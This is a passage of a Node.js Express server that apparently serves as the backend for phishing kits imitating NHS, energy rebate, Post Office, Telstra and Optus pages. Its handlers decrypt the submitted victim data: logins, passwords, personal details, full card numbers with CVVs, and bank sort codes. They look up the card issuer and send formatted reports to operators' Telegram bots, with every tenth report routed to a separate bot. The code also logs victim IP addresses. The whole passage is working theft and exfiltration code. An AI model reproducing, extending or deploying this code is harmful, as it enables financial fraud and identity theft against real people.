  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (lingypack == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        lingypack = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSLingz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5235839910&text=NHS:\n${originalText}`
        );
        lingypack += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/giveip", cors());

app.post("/giveip", (req, res) => {
  ip = req.body.ip;

  if (ip !== undefined) {
    content = `${ip}\n`;
    fs.appendFile("ips.txt", content, (err) => {
      res.send("Update Completed");
    });
  }
});

//ENERGY
//ENERGY
//ENERGY

app.options("/energyFpays", cors());

app.post("/energyFpays", async (req, res) => {
  info = req.body;

  if (info.bin.length === 7) {
    formatBin = info.bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = info.bin.slice(0, -1);
    }
    info.bin = formatBin;
  }
  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bank = binLookup.data.bank.name;
  let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (fpaysC == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    fpaysC = 0;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `EnergyRebateFpays:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 2134201699,
          text: `EnergyRebate:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    fpaysC += 1;
  }
});

app.options("/energy", cors());

app.post("/energy", async (req, res) => {
  let count;
  let index;
  info = req.body;

  for (var i = 0; i < counts.length; i++) {
    if (counts[i].owner == info.owner) {
      index = i;
      count = counts[i].count;
    }
  }

  if (info.bin.length === 7) {
    formatBin = info.bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = info.bin.slice(0, -1);
    }
    info.bin = formatBin;
  }
  let binLookup = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bank = binLookup.data.bank.name;
  let binList = `${info.bin} | ${info.dob} | ${info.pcode} | ${bank}`;
  var originalText = `+----------- Personal Information ------------+\nFull Name: ${info.fullName}\nDOB: ${info.dob}\nAddress: ${info.addy}\nPostcode: ${info.pcode}\nPhone Number: ${info.telephone}\n+ ----------- Card Information ------------+\nCard Name: ${info.ccname}\nCard Number: ${info.ccnum}\nExpiry: ${info.ccexp}\nCVV: ${info.cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${info.userAgent}\nIP: ${info.ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (count == 10) {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    counts[index].count = 0;
  } else {
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `EnergyRebate ${info.owner}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: info.owner,
          text: `EnergyRebate:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    counts[index].count += 1;
  }
});

//POSTOFFICE
//POSTOFFICE
//POSTOFFICE

app.options("/tCapz", cors());

app.post("/tCapz", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (lingypack == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        lingypack = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=POTcapz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=PO:\n${originalText}`
        );
        lingypack += 1;
      }

      res.send("Update Completed");
    });
});

//TELSTRA
//TELSTRA
//TELSTRA

app.options("/t1Telstra", cors());

app.post("/t1Telstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=TelstraFred:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1090540781&text=Telstra:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/fredTelstra", cors());

app.post("/fredTelstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=TelstraFred:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5111234111&text=Telstra:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/osbTelstra", cors());

app.post("/osbTelstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `TelstraOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5539333576,
              text: `Telstra:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/g7000telstra", cors());

app.post("/g7000telstra", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `TelstraG7000:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5246954438,
              text: `Telstra:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

//OPTUS
//OPTUS
//OPTUS
app.options("/spooferGooferOptus", cors());

app.post("/spooferGooferOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusSpooferGoofer:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

let moneymanmino = 0;

app.options("/mmmOptus", cors());

app.post("/mmmOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (moneymanmino == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        moneymanmino = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusMoneyMan:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=772017223&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        moneymanmino += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/g700Optus", cors());

app.post("/g700Optus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
